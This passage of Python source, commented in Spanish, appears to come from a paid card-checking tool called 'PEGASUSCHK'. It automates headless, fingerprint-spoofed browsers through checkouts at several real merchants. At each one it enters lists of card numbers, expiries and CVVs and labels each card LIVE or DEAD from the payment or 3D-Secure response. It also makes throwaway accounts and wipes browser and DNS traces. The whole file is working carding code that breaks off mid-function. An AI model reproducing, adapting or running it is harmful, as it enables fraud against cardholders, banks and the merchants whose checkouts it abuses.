        sb.driver.execute_cdp_cmd('Network.clearBrowserCache', {})
        sb.driver.execute_cdp_cmd('Network.clearBrowserCookies', {})

        subprocess.run('CD..', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('CD..', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('IPCONFIG /FLUSHDNS', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('rem ARCHIVOS TEMPORALES DE INTERNET', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('rem COOKIES', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('rem HISTORIAL', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('rem FORMULARIOS', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 
        subprocess.run('RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True) 

    except:
        print('Error al cambiar DNS')

    try:
        sb.delete_all_cookies()      
        time.sleep(1)

    except:
        print('Error al desbanear')

    # Tiempo para que limpie los registros
    time.sleep(5)

#|--------------------------------Main-Gates---------------------------------|

def Legacy_gate(self):

    if self.username == "Morenoxd":
        payitgov(self)
        return None

    if self.username == "ZenoxPav":
        koaj(self)
        return None

    if self.username == "Paulispro":
        PaulisBog(self)
        return None

    bookaway(self)
    if os.path.exists('latest_logs'):
        shutil.rmtree('latest_logs')
    return None

def Horizon_gate(self):

    if self.username == "timmysornerx":
        alicante(self)
        return None

    falabella(self)
    return None

def Infinity_gate(self):

    self.cont = 0 
    createAccount = 0
    self.text_changed.emit("Iniciando OTP 3D Valid | INFINITY")

    if self.username == "Lau" or self.username == "ZenoxPav" or self.username == "Jeico1245" or self.username == "ninja5k":
        payitgov(self)
        return None

    if self.username == "Morenoxd":
        ivitech(self)
        return None

    if "BANCO DE BOGOTA" in self.tools.bintype(self.ccs[self.cont]):
        if self.username == "Paulispro":
            PaulisBog(self)
            return None
        bookaway(self)
        return None
    
    if self.username == "Paulispro":
        Paulispro(self)
        return None

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)
        
        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            # Determina la plataforma basada en el User-Agent

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                self.email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                self.passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                self.phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                self.address = str(random.randint(100, 999)) + ' winding lake rd'


                links = [

                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=142622&auto=true',
                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=143108&auto=true',
                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=143474&auto=true',
                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=143328&auto=true'

                ]

                random_account = setCuenta("", "", "GET")
                link = random.choice(links)

                try:

                    print('USER AGENT ACTUAL:', sb.get_user_agent())
                    sb.open(link)

                    sb.click('button#actionButtonAddToCart')
                    time.sleep(random.uniform(1, 3))

                    if createAccount == 1:

                        createAccount = 0

                        self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

                        sb.open('shoalcreekanimalhospital.securevetsource.com/signup.pml?destination=/checkoutReview.pml')
                        sb.type('input#signUpPhoneNumber', self.phone_number)
                        sb.click('button#collectPhoneStep')
                    
                        # FORM REGISTER

                        sb.type('input#signUpFirstName', self.first1)
                        sb.type('input#signUpLastName', self.last1)
                        sb.type('input#signUpEmail', self.email)
                        sb.type('input#signUpPassword', self.passwd)
                        sb.click('button#moreAboutYouStep')

                        sb.open('shoalcreekanimalhospital.securevetsource.com/visitorLogin.pml?destination=/checkoutReview.pml')

                        msgEMite = 'Cuenta registrada con exito.' + self.email + self.passwd
                        self.printed.emit(msgEMite)
                        setCuenta(self.email, self.passwd, "VBV")

                        # Shipping Address FORM

                        sb.wait_for_element('button#noAddressNextButton')
                        sb.type('input#noAddress_firstName', self.first1)
                        sb.type('input#noAddress_lastName', self.last1)
                        sb.type('input#noAddress_address1',  self.address)
                        sb.type('input#noAddress_city', 'Sunrise')
                        sb.select_option_by_text('select#noAddress_region', 'FL')
                        sb.type('input#noAddress_postalCode', '33351')
                        sb.type("#noAddress_phone1", self.phone_number)
                        sb.click('button#noAddressNextButton')

                        try:
                            sb.click('button#shippingOptionsSaveButton')
                        except:
                            sb.click('button#Dialog_changing-clinics_button_keep_ShippingAddresses')
                            sb.click('button#shippingOptionsSaveButton')

                    else:

                        # FORM LOGIN

                        sb.open('shoalcreekanimalhospital.securevetsource.com/visitorLogin.pml?destination=/checkoutReview.pml')

                        try:
                            sb.type('input#login_username', random_account['email'])
                        except Exception as e:
                            sb.click('#loginWithEmailLink')
                            sb.type('input#login_username', random_account['email'])                            
                        time.sleep(random.uniform(1, 3))
                        sb.type('input#login_password', random_account['password'])
                        sb.click('button#logInButton')

                        # Debug analisis cuentas
                        #time.sleep(random.uniform(1, 3))

                        try:
                            sb.click('button#addressNextButton')                            
                        except:
                            msgAccount = sb.get_text("//div[@class='kibble-alert-content']/p", timeout=3)
                            setCuenta(random_account['email'], random_account['password'], "DELETE")
                            createAccount = 1

                        sb.click('#shippingOptionsSaveButton')
                        time.sleep(random.uniform(1, 3))
                        #sb.click('button#shippingOptionsSaveButton')
                        #time.sleep(random.uniform(1, 3))

                        cuentaLog = random_account['email'] + ':' + random_account['password']
                        self.printed.emit(cuentaLog)
                        

                    self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                    contador = 0

                    while self.cont < self.total_lines and contador < 4:

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                    
                        # frame payment
                        # <iframe id="iframe_container_content" width="100%" height="180px" style="" frameborder="0" src="https://secure.payconex.net/iframe/styled.php?aid=120614963364&amp;lang=en&amp;cvv=required&amp;expy=double_input&amp;timeout=10&amp;css=eyJjbGFzc19yb3ciOiIiLCJjbGFzc19sYWJlbCI6ImRpc3BsYXk6YmxvY2s7Y29sb3I6ICMwMDFBMTQ7Zm9udC1mYW1pbHk6ICdCYXJsb3cnLCBzYW5zLXNlcmlmO2ZvbnQtc2l6ZTogMTRweDtmb250LXN0eWxlOiBub3JtYWw7Zm9udC13ZWlnaHQ6IDUwMDtsaW5lLWhlaWdodDogMjRweDsgbWFyZ2luLWJvdHRvbTogNHB4IiwiY2xhc3NfaW5wdXRfYm94IjoiaGVpZ2h0OjQwcHg7Ym9yZGVyOjFweCBzb2xpZCAjQjdCQ0JDO2JvcmRlci1yYWRpdXM6IDZweDtmb250LWZhbWlseTogJ0JhcmxvdycsIHNhbnMtc2VyaWY7Zm9udC1zaXplOiAxNnB4O2ZvbnQtc3R5bGU6IG5vcm1hbDtmb250LXdlaWdodDogNDAwO2xpbmUtaGVpZ2h0OiAyNHB4O2NvbG9yOiAjMDAxQTE0O3BhZGRpbmc6OHB4O2JveC1zaXppbmc6Ym9yZGVyLWJveCIsImlkX2Zvcm0iOiIiLCJpZF9leHB5X2lucHV0X21vbnRoIjoid2lkdGg6IDcwcHg7IG1hcmdpbi1yaWdodDogOHB4IiwiaWRfZXhweV9pbnB1dF95ZWFyIjoid2lkdGg6IDcwcHg7IiwiaWRfbnVtYmVyX3JvdyI6IndpZHRoOiAxMDAlOyBtYXgtd2lkdGg6IDQwMHB4OyBtYXJnaW4tYm90dG9tOiAyNHB4IiwiaWRfbnVtYmVyX2lucHV0IjoibWluLXdpZHRoOiAzMjBweDtiYWNrZ3JvdW5kOiNGRkZGRkYgbm8tcmVwZWF0IGxlZnQgY2VudGVyO3BhZGRpbmctbGVmdDo0MHB4OykiLCJpZF9leHB5X3JvdyI6Im1hcmdpbi1yaWdodDogMTJweDtkaXNwbGF5OiBpbmxpbmUtYmxvY2siLCJpZF9jdnZfcm93IjoiZGlzcGxheTogaW5saW5lLWJsb2NrO3dpZHRoOjEwMCU7IG1heC13aWR0aDogMTU1cHgiLCJpZF9jdnZfaW5wdXQiOiJ3aWR0aDogMTAwJTsgbWF4LXdpZHRoOiAxNzVweCIsImlkX3RpbWVvdXRfbGluayI6IiJ9&amp;text=eyJudW1iZXIiOnsibGFiZWwiOiJDYXJkIG51bWJlciIsInBsYWNlaG9sZGVyIjoiMDAwMCAwMDAwIDAwMDAgMDAwMCJ9LCJjdnYiOnsibGFiZWwiOiJTZWN1cml0eSBjb2RlIiwicGxhY2Vob2xkZXIiOiIwMDAifSwiZXhweV9zaW5nbGUiOnsibGFiZWwiOiJFeHBpcnkgZGF0ZSIsInBsYWNlaG9sZGVyIjoiTU1ZWSJ9LCJleHB5X2RvdWJsZSI6eyJsYWJlbCI6IkV4cGlyeSBkYXRlIn0sImV4cHlfc2luZ2xlX2Ryb3Bkb3duIjp7ImxhYmVsIjoiRXhwaXJ5IGRhdGUiLCJwbGFjZWhvbGRlciI6Ik1NWVkifSwidGltZW91dF9oZWFkZXIiOnsidGV4dCI6IlNlc3Npb24gdGltZWQgb3V0In0sInRpbWVvdXRfYm9keSI6eyJ0ZXh0IjoiWW91ciBzZXNzaW9uIHRpbWVkIG91dC4gUGxlYXNlIHRyeSBhZ2Fpbi4ifX0%3D"></iframe>
                        try:
                            sb.wait_for_element('#iframe_container_content')
                        except Exception as e:
                            if "ElementNotVisibleException" in e:
                                msgConsole = "Cuenta dañada", self.email
                                self.printed.emit(msgConsole)
                            
                        sb.switch_to_frame('#iframe_container_content')
                        sb.type('input#id_number_input', self.ccs[self.cont])
                        sb.type('input#id_expy_input_month', self.mes[self.cont])
                        sb.type('input#id_expy_input_year', self.anio[self.cont][2:4])
                        sb.type('input#id_cvv_input', self.cvv[self.cont])
                        time.sleep(random.uniform(1, 3))

                        sb.switch_to_default_content()
                        time.sleep(1)
                        sb.click("//div[@id='placeOrder_default']//button[@id='place-order']")
                        
                        # Analizando resultados

                        time.sleep(random.uniform(2, 5))

                        try:

                            sb.wait_for_element('#alertPopupMessage')
                            msgPay = sb.get_text('#alertPopupMessage')
                            createAccount = 2
                            
                        except Exception as e: # 3D no encontrado

                            print('Error analizando pago:', e)

                            sb.wait_for_element('#iframe_container_content')
                            sb.switch_to_frame('#iframe_container_content')
                            sb.wait_for_element('#challengeiframe')
                            sb.switch_to_frame('#challengeiframe')
                            msgPay = sb.get_text('body')
                            createAccount = 2
                        
                            
                        print(msgPay)

                        ulti = self.ccs[self.cont][-4:]
                        palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                        encontrada = any(palabra in msgPay for palabra in palabras_clave)
                        
                        if encontrada:
                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                self.text_live.emit(livemsg)
                        else:
                            self.text_dead.emit(deadmsg)

                        sb.switch_to_default_content()
                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(4, 7))
                        sb.click('button#addressNextButton')
                        sb.click('button#shippingOptionsSaveButton')

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        break
                
                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!')
                    print('Error en configuracion de navegador.', e)
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            

        if os.path.exists('latest_logs'):
            shutil.rmtree('latest_logs')      
    self.text_changed.emit('TESTEO FINALIZADO')

#|--------------------------------Auxiliar-Gates------------------------------|
    
def figma(self):

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1

                teams  = [
                    '1430664809906163265',
                    '1430981124246509032',
                    '1430981789742356222',
                    '1430982210728257424',
                    '1430983025166520539',
                    '1430983652852867540',
                    '1430983949643191850',
                    '1430984371461018327',
                    '1430987701674183855',
                    '1431377811685501144',
                    '1431380487061668791',
                    '1431381135903828136',
                    '1431381135903828136',
                    '1431382043255976373',
                    '1440860071352632383'
                ]

                emails = [
                    'naikirory@gmail.com',
                    'vetade6353@chysir.com',
                    'hegak66288@digopm.com',
                    'cetor14259@abaot.com',
                    'tatoved840@advitize.com',
                    'rikele3806@digopm.com',
                    'girik99857@digopm.com',
                    'hojes37566@jameagle.com',
                    'lihica5986@jameagle.com',
                    'rehem66323@aleitar.com',
                    'voboji1883@aqqor.com',
                    'wotodid131@aleitar.com',
                    'papanid347@ruhtan.com',
                    'lefixoh494@aleitar.com',
                    'tolih38256@cpaurl.com'
                ]

                indice = random.randint(0, len(emails) - 1)
                team = teams[indice]
                email = emails[indice]

                link = f"https://www.figma.com/files/team/{team}/upgrade-team/{team}/upgrade_existing_team/payment_and_address?billingPeriod=2"
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())

                try:
                    sb.open(link)

                    self.text_changed.emit('🌟 Preparando el despegue con la carga de datos.')                    

                    contador = 0

                    time.sleep(random.uniform(3, 5))
                    sb.type('#email', email)
                    sb.type('#current-password', 'Dinero123*')
                    sb.click('/html/body/div[1]/div/div/div[1]/div/form/button[2]')

                    while self.cont < self.total_lines and contador < 5:
                        
                        if contador > 0:
                            check_dead(self.cont,self.username,self.password)
                            self.dead_disp.emit()

                        # CC FRAME

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]
                        fecha = f"{mes}{ano[2:4]}"

                        try:
                            sb.wait_for_element('#stripe-payment-element > div > iframe', timeout=15)
                        except:
                            sb.wait_for_element('#react-page > div > div > div > div:nth-child(1) > div > div.team_upgrade_v2--checkoutPageContent--HATl6 > div.team_upgrade_v2--checkoutStepContainer--a0yBO > div:nth-child(6)')
                            self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, conectate a otro pais. ¡Estamos aquí para ayudarte! 🌐✨')
                            return None

                        sb.switch_to_frame('#stripe-payment-element > div > iframe')
                        sb.type('#Field-numberInput', self.ccs[self.cont])
                        sb.type('#Field-expiryInput', fecha)
                        sb.type('#Field-cvcInput', self.cvv[self.cont])
                        sb.switch_to_default_content()
                        time.sleep(random.uniform(2, 3))

                        # Billing 
                        
                        sb.type('#name_on_card', fullname)
                        sb.type('#line1', address)
                        sb.type('#city', 'Sunrise')
                        sb.select_option_by_value("#address-form-container > div.address_form--groupedRow--Ib5dr > div:nth-child(1) > div > select", 'FL')
                        sb.type('#postal_code', '33351')
                        time.sleep(random.uniform(2, 3))

                        sb.click('#react-page > div > div > div > div:nth-child(1) > div > div.team_upgrade_v2--checkoutPageContent--HATl6 > div.team_upgrade_v2--checkoutSidebarContainer--utUoC > button')
                        time.sleep(random.uniform(2, 3))

                        # Revision
                        self.text_changed.emit('🚀 El análisis de datos de Pegasus ha comenzado. ¡Buena suerte en este viaje de descubrimiento!')

                        sb.wait_for_element_clickable('#react-page > div > div > div > div:nth-child(1) > div > div.team_upgrade_v2--checkoutPageContent--HATl6 > div.team_upgrade_v2--checkoutSidebarContainer--utUoC > button')
                        msgPay = sb.get_text('#react-page > div > div > div > div:nth-child(1) > div > div.team_upgrade_v2--checkoutPageContent--HATl6 > div.team_upgrade_v2--checkoutStepContainer--a0yBO > div:nth-child(4) > div > div > div > div.stripe_payment_and_address--error--z-IbH', timeout=15)
                        print(msgPay)

                        #try:
                            # #card-panel > div > div > form > div > div > div.p-GridCell.p-GridCell--12.p-GridCell--md6 > div > div.AnimateSinglePresence
                        #    sb.wait_for_element('#stripe-payment-element > div > iframe', timeout=2)
                        #    sb.switch_to_frame('#stripe-payment-element > div > iframe')
                        #    sb.wait_for_element('#card-panel > div > div > form > div > div > div.p-GridCell.p-GridCell--12.p-GridCell--md6 > div > div.AnimateSinglePresence', timeout=2)
                        #    contadorBan = contadorBan + 1
                        #    if self.cont == 0 or contadorBan == 3:
                        #        self.text_changed.emit('🚫 IP**: ✈️ El vuelo de Pegasus fue detenido por alta actividad desde tu IP. 🛑')
                        #        time.sleep(5)
                        #        return None
                        #    break
                        #except:
                        #    pass

                        #sb.switch_to_default_content()

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"

                        if self.tools.repetir(livemsg) == True:
                            
                            cobro_relive(self.username, self.password)
                            self.dead_disp.emit()
                            msgPay = 'RELIVE'
                            deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                            self.text_dead.emit(deadmsg)
                            
                        else:

                            if 'tarjeta está incompleto' in msgPay or 'number is incomplete' in msgPay or 'expiration date is incomplete' in msgPay or 'Invalid account' in msgPay or 'has been declined' in msgPay or 'was declined' in msgPay or 'number is incorrect' in msgPay or 'ha sido rechazada' in msgPay or 'es incorrecto' in msgPay:
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)

                            elif 'security code' in msgPay:
                                livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                                self.text_live.emit(livemsg)
                                self.printed.emit(msgPay)


                            elif 'has expired' in msgPay or 'ha caducado' in msgPay:
                                livemsg = f"Auth_LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                                self.text_live.emit(livemsg)
                                self.printed.emit(msgPay)

                            # Excepcion MC
                            elif 'MASTERCARD' in typ and 'DEBIT' in typ and 'COL' in typ and 'not support this type of purchase':
                                funds = "LOWFUNDS"
                                livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{funds}\n"
                                self.text_live.emit(livemsg)
                                self.printed.emit(msgPay)

                            # EXCEPCION VISA
                            elif 'VISA' in typ and 'DEBIT' in typ and 'COL' in typ and 'not support this type of purchase':
                                msgPay = 'Your card has been declined.'
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)
                            
                            elif 'Your card does not support this type of purchase' in msgPay or 'Tu tarjeta no admite este tipo de compra' in msgPay or ' error occurred while processing' in msgPay or ' error durante el procesamiento' in msgPay:
                                self.text_live.emit(livemsg)
                                self.printed.emit(msgPay)

                            else:
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)
                                self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                                return None

                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        contadorBan = 0

                        time.sleep(random.uniform(1, 3))

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                        break


                except Exception as e:
                    
                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    print('Error en configuracion de navegador.', e)
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message = (str(exc_type)+' '+str(exc_tb.tb_lineno))+' '+str(link)
                    self.printed.emit(error_message)
                    if 'WebDriverException' in str(exc_type) and '504' in str(exc_tb.tb_lineno):
                        self.text_changed.emit('🚫 La IP actual está bloqueada. Por favor, cambia de IP para continuar tu vuelo con Pegasus. ✨!')
                        return None
                
            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue  
    
    self.text_changed.emit('TESTEO FINALIZADO')

def alme(self):

    try:
        self.cont = 0 
        self.text_changed.emit("Iniciando Auth Valid | LEGACY")

        while self.cont < self.total_lines:

            headless2 = getHeadless(self)
            user_agent, device_metrics = openBrowser(2, headless2)

            with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

                sb.save_screenshot_after_test = False
                sb.save_page_source_after_test = False

                if "Macintosh" in user_agent:

                    platform = "MacIntel"

                elif "Windows" in user_agent:

                    platform = "Win32"

                else:

                    platform = "Linux"

                sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                    "userAgent": user_agent,
                    "platform": platform,

                })

                sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                    "mobile": True,
                    "width": device_metrics["width"],
                    "height": device_metrics["height"],
                    "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                    "fitWindow": True

                })

                self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

                try:

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        return None

                    email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                    passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                    phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                    address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                    ruc_base = ''.join([str(random.randint(0, 9)) for _ in range(10)])
                    dv = calcular_digito_verificador(ruc_base)
                    dni = ruc_base + str(dv)

                    links = [

                        'https://www.alme.com.pe/product/facial-de-limpieza-profunda'

                    ]

                    link = random.choice(links)

                    print('USER AGENT ACTUAL:', sb.get_user_agent())

                    # Abre el enlace
                    sb.open(link)
                    sb.refresh()

                    # Espera a que el botón "Agregar al carro" sea visible
                    sb.wait_for_element("#bs-product-form > div.col-12.form-group.bs-agregar > button.btn.btn-primary.w-100.p-3", timeout=20)

                    # Resalta el botón
                    sb.highlight("#bs-product-form > div.col-12.form-group.bs-agregar > button.btn.btn-primary.w-100.p-3")

                    # Verifica si el botón es visible
                    is_visible = sb.is_element_visible("#bs-product-form > div.col-12.form-group.bs-agregar > button.btn.btn-primary.w-100.p-3")
                    print("¿El botón es visible?", is_visible)

                    # Si todo está bien, hacer clic
                    if is_visible:
                        sb.click("//button[contains(text(), 'Agregar al carro')]")

                    time.sleep(random.uniform(3, 5))
                    sb.open("https://www.alme.com.pe/cart/display/")
                    time.sleep(1)
                    sb.refresh()

                    sb.click('body > main > main > div > div > div:nth-child(3) > div > div.col-12.mb-2.text-right > div > label', timeout=15)
                    sb.click('body > main > main > div > div > div:nth-child(3) > div > div:nth-child(5) > div > div > button')

                    sb.type('#checkout-login-form > div.form-group.input-container > div > input', self.email)
                    sb.click('#checkout-login-form > div.text-right.sm-center > input')

                    sb.type('#checkout_co_name', self.first1)
                    sb.type('#checkout_co_last_name', self.last1)
                    sb.type('#checkout_co_phone', phone_number)
                    sb.type('#generated_input-code', dni)
                    sb.type("#generated_input-city", "Lima")
                    sb.click('#pay_type > div:nth-child(1) > label > input[type=radio]')

                    contador = 0
                    while self.cont < self.total_lines and contador < 10:
                        
                        time.sleep(random.uniform(1, 2))
                        sb.click('#checkout_button')
                        time.sleep(random.uniform(1, 2))
                        sb.click("#pay_method > div > input")
                        
                        # CC FRAME

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]
                        fecha = f"{mes}{ano[2:4]}"
                        
                        self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')
                        time.sleep(random.uniform(3, 4))

                        sb.wait_for_element('#visaNetJS')
                        sb.switch_to_frame('#visaNetJS')
                        sb.click('#paymentMethods > div > div > section > label:nth-child(2)', timeout=20)
                        time.sleep(1)
                        sb.click('#payment-continue')
                        time.sleep(random.uniform(1, 2))

                        selector = "#number"
                        type_with_delay(sb, selector, self.ccs[self.cont], delay=1)

                        selector = "#expiry"
                        type_with_delay(sb, selector, fecha, delay=1)

                        sb.type('#cvc', self.cvv[self.cont])
                        
                        sb.type('#name', self.first1)
                        sb.type('#lastname', self.last1)
                        sb.type('#email', email)

                        time.sleep(random.uniform(2, 3))
                        sb.type('#city', 'Lima')
                        sb.type('#country', 'Peru')

                        time.sleep(random.uniform(1, 2))
                        sb.click('#btn-pay-submit')
                        time.sleep(random.uniform(1, 2))
                        sb.click('#dynamic-conversion > section > div > label')
                        time.sleep(random.uniform(1, 2))
                        sb.click('#dcc-accept')
                        
                        time.sleep(random.uniform(2, 4))

                        # Analizando resultados

                        try:
                            sb.wait_for_element('#Cardinal-CCA-IFrame')
